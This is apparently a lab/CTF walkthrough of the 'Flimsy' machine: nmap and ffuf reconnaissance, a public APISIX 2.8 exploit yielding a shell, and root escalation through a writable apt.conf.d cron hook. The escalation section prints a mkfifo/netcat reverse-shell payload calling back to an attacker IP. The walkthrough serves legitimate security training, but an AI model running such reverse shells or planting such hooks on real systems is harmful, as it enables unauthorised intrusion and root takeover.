<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 192.168.118.220 -p- -T4 -v

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 03:08 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:08
Completed NSE at 03:08, 0.00s elapsed
Initiating NSE at 03:08
Completed NSE at 03:08, 0.00s elapsed
Initiating NSE at 03:08
Completed NSE at 03:08, 0.00s elapsed
Initiating Ping Scan at 03:08
Scanning 192.168.118.220 [4 ports]
Completed Ping Scan at 03:08, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:08
Completed Parallel DNS resolution of 1 host. at 03:08, 0.03s elapsed
Initiating SYN Stealth Scan at 03:08
Scanning 192.168.118.220 [65535 ports]
Discovered open port 22/tcp on 192.168.118.220
Discovered open port 3306/tcp on 192.168.118.220
Discovered open port 80/tcp on 192.168.118.220
Increasing send delay for 192.168.118.220 from 0 to 5 due to 452 out of 1129 dropped probes since last increase.
Increasing send delay for 192.168.118.220 from 5 to 10 due to 35 out of 87 dropped probes since last increase.
SYN Stealth Scan Timing: About 4.53% done; ETC: 03:19 (0:10:53 remaining)
SYN Stealth Scan Timing: About 6.11% done; ETC: 03:24 (0:15:37 remaining)
SYN Stealth Scan Timing: About 7.09% done; ETC: 03:29 (0:19:52 remaining)
SYN Stealth Scan Timing: About 8.32% done; ETC: 03:32 (0:22:13 remaining)
SYN Stealth Scan Timing: About 11.36% done; ETC: 03:30 (0:19:38 remaining)
SYN Stealth Scan Timing: About 14.42% done; ETC: 03:29 (0:17:54 remaining)
SYN Stealth Scan Timing: About 17.48% done; ETC: 03:28 (0:16:51 remaining)
SYN Stealth Scan Timing: About 21.64% done; ETC: 03:28 (0:15:49 remaining)
SYN Stealth Scan Timing: About 24.95% done; ETC: 03:27 (0:14:48 remaining)
SYN Stealth Scan Timing: About 29.30% done; ETC: 03:27 (0:13:48 remaining)
Discovered open port 9443/tcp on 192.168.118.220
SYN Stealth Scan Timing: About 35.13% done; ETC: 03:27 (0:12:46 remaining)
SYN Stealth Scan Timing: About 41.10% done; ETC: 03:28 (0:11:46 remaining)
SYN Stealth Scan Timing: About 45.93% done; ETC: 03:28 (0:10:44 remaining)
Discovered open port 43500/tcp on 192.168.118.220
SYN Stealth Scan Timing: About 50.99% done; ETC: 03:28 (0:09:43 remaining)
SYN Stealth Scan Timing: About 56.95% done; ETC: 03:28 (0:08:40 remaining)
SYN Stealth Scan Timing: About 62.13% done; ETC: 03:28 (0:07:38 remaining)
SYN Stealth Scan Timing: About 67.21% done; ETC: 03:28 (0:06:37 remaining)
SYN Stealth Scan Timing: About 72.32% done; ETC: 03:28 (0:05:36 remaining)
SYN Stealth Scan Timing: About 77.81% done; ETC: 03:28 (0:04:33 remaining)
SYN Stealth Scan Timing: About 82.98% done; ETC: 03:28 (0:03:29 remaining)
SYN Stealth Scan Timing: About 88.26% done; ETC: 03:28 (0:02:25 remaining)
SYN Stealth Scan Timing: About 93.32% done; ETC: 03:28 (0:01:22 remaining)
Completed SYN Stealth Scan at 03:29, 1261.99s elapsed (65535 total ports)
Initiating Service scan at 03:29
Scanning 5 services on 192.168.118.220
Completed Service scan at 03:29, 12.81s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 192.168.118.220
Retrying OS detection (try #2) against 192.168.118.220
Retrying OS detection (try #3) against 192.168.118.220
Retrying OS detection (try #4) against 192.168.118.220
Retrying OS detection (try #5) against 192.168.118.220
Initiating Traceroute at 03:29
Completed Traceroute at 03:29, 0.40s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 03:29
Completed Parallel DNS resolution of 2 hosts. at 03:29, 0.14s elapsed
NSE: Script scanning 192.168.118.220.
Initiating NSE at 03:29
Completed NSE at 03:30, 6.71s elapsed
Initiating NSE at 03:30
Completed NSE at 03:30, 3.38s elapsed
Initiating NSE at 03:30
Completed NSE at 03:30, 0.00s elapsed
Nmap scan report for 192.168.118.220
Host is up (0.28s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE             VERSION
22/tcp    open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62361a5cd3e37be170f8a3b31c4c2438 (RSA)
|   256 ee25fc236605c0c1ec47c6bb00c74f53 (ECDSA)
|_  256 835c51ac32e53a217cf6c2cd936858d8 (ED25519)
80/tcp    open  http                OpenResty web app server 1.21.4.1
|_http-title: Welcome to OpenResty!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: openresty/1.21.4.1
3306/tcp  open  mysql               MySQL (unauthorized)
9443/tcp  open  ssl/tungsten-https?
43500/tcp open  http                OpenResty web app server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/4%OT=22%CT=1%CU=40783%PV=Y%DS=2%DC=T%G=Y%TM=6402AD2D
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=110%TI=Z%II=I%TS=A)OPS(O1=M54
OS:EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6
OS:=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF
OS:=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 17.436 days (since Tue Feb 14 17:01:47 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   397.08 ms 192.168.49.1
2   397.25 ms 192.168.118.220

NSE: Script Post-scanning.
Initiating NSE at 03:30
Completed NSE at 03:30, 0.00s elapsed
Initiating NSE at 03:30
Completed NSE at 03:30, 0.00s elapsed
Initiating NSE at 03:30
Completed NSE at 03:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1312.12 seconds
           Raw packets sent: 74577 (3.286MB) | Rcvd: 70387 (2.819MB)
```
We have 5 ports opened here, port 22 which runs ssh, port 80&43500 which runs http, port 3306 that runs mysql and port 9443 which runs tungsten-https. Our enumeration today will be focused on port 80 and port 43500.



<h2>Enumeration Port 80</h2>

Going to the webpage you should get something like this

![image](https://user-images.githubusercontent.com/67879936/222871755-79016811-30bf-4eb7-a5c4-d377c5b8c5a7.png)

We got a welcome page here. Lets fire up ffuf to help search for directories

>command: ffuf -u "http://192.168.118.220//FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Flimsy]
└─$ ffuf -u "http://192.168.118.220//FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.118.220//FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 1097, Words: 106, Lines: 29, Duration: 278ms]
index.html              [Status: 200, Size: 1097, Words: 106, Lines: 29, Duration: 200ms]
:: Progress: [32298/32298] :: Job [1/1] :: 99 req/sec :: Duration: [0:03:38] :: Errors: 0 ::
```
oops, we found nothing. Moving on with our enumeration.



<h2>Enumeration Port 43500</h2>

Navigating to the webpage

![image](https://user-images.githubusercontent.com/67879936/222872557-fdab2979-e3e3-4f88-80d2-a6f24c4cf056.png)

We got a "route not found" error message

Lets check the header of this webpage using curl

>command: curl -v http://192.168.118.220:43500/

![image](https://user-images.githubusercontent.com/67879936/222872630-a69d8d56-0e76-4cb9-b6bb-97e874f48065.png)

From the above screenshot, you'll see ```APISIX/2.8```. Lets check for available exploits

![image](https://user-images.githubusercontent.com/67879936/222872788-e7aa64e8-0c2b-4f9c-ad4c-645661e1e352.png)

Lets go ahead and exploit this vulnerability




<h2>Exploitation</h2>

Link to Exploit:https://www.exploit-db.com/exploits/50829

Download this exploit to your machine. If that is done you can go ahead and run the exploit

>command: python exploit.py target_url lhost lport

Ensure you have your netcat listener running before running the above command

>nc -nvlp 1234

![image](https://user-images.githubusercontent.com/67879936/222873311-b6a9fae6-7fe4-4113-bff2-faf3c5084a9c.png)

cool, we got a shell as user Franklin. Lets go ahead and escalate our privileges.




<h2>Privilege Escalation</h2>

I found a cronjob running

>command: cat /etc/crontab

![image](https://user-images.githubusercontent.com/67879936/222933515-b9daefe4-8d3b-4f76-9b37-1ef33e3fc12f.png)

I ran linpeas to look for writable files

![image](https://user-images.githubusercontent.com/67879936/222934579-aebd7881-b6c3-47cd-ad1b-db0c53a9a096.png)

To exploit this apt-get cronjob we will create a malicious inside the ```apt.conf.d``` file. When the apt-get cron job runs, it would install the malicious package, potentially us a shell as the root user.

payload:```echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.53 80 >/tmp/f"};' > abeg```

![image](https://user-images.githubusercontent.com/67879936/222934828-5a964dd7-bf6c-4ba1-8156-27413e22c846.png)

Now ensure you have your netcat listner set up, so you can get a shell as root user back on your listener this is because apt-get update is set to update the packages everytime with root privileges.

![image](https://user-images.githubusercontent.com/67879936/222934899-71cf2d03-24ac-473a-bfca-af346f8db365.png)

Boom!!! We got a shell as the root user

That will be all for today
<br> <br>
[Back To Home](../../index.md)














































